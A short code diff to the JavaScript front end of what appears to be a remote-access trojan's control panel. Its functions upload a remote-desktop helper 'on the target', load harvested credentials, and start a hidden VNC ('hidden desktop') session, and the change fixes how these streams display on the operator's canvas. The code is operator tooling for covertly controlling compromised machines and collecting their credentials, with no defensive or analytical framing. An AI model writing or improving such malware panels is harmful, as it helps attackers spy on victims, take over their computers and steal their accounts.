@@ -52,6 +52,7 @@ async function connectDesktop() {
   if (rdSocket && rdSocket.readyState <= 1) return;
   const canvas = document.getElementById("rd-canvas");
   const status = document.getElementById("rd-status");
+  try { canvas.getContext("2d").clearRect(0, 0, canvas.width, canvas.height); } catch (err) {}
   // ask the panel to upload+launch the rd helper on the target (best effort)
   try {
     await fetch(`/api/${sessionId}/desktop`, {
@@ -235,6 +236,10 @@ async function loadCreds() {
 document.getElementById("hvnc-start").addEventListener("click", async () => {
   await resolveSession();
   const status = document.getElementById("rd-status");
+  // drop the old desktop stream so HVNC frames don't interleave with it
+  try { if (rdSocket) { rdSocket.onclose = null; rdSocket.close(); rdSocket = null; } } catch (err) {}
+  const canvas = document.getElementById("rd-canvas");
+  try { canvas.getContext("2d").clearRect(0, 0, canvas.width, canvas.height); } catch (err) {}
   status.textContent = "starting hidden desktop…";
   try {
     const resp = await fetch(`/api/${sessionId}/hvnc`, { method: "POST", headers: {
